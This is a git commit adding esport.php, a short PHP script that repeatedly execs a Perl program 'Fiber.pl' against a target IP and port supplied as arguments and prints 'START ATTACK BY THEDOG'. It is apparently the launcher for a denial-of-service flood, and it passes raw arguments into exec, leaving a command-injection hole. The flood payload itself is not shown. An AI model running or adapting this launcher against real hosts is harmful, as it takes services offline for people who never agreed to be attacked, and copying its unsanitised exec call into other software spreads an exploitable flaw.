fa749918a3661b727bca2055de4d3b7e327e46be
dogter1 <49182050+dogter1@users.noreply.github.com>
2022-07-01 09:41:28 +0700

    Add files via upload

---
+++ esport.php
@@ -0,0 +1,7 @@
+<?php
+for ($x = 0; $x <= $argv[3]; $x++) {
+	$rand = rand(0,0);
+	exec('/cd/perl Fiber.pl '.$argv[1].' '.$argv[2].' 0 '.$rand.' ');
+	echo "START ATTACK BY THEDOG IP ".$argv[1].":".$argv[2]." TIME $x THREADS = $rand\n";
+}
+?>
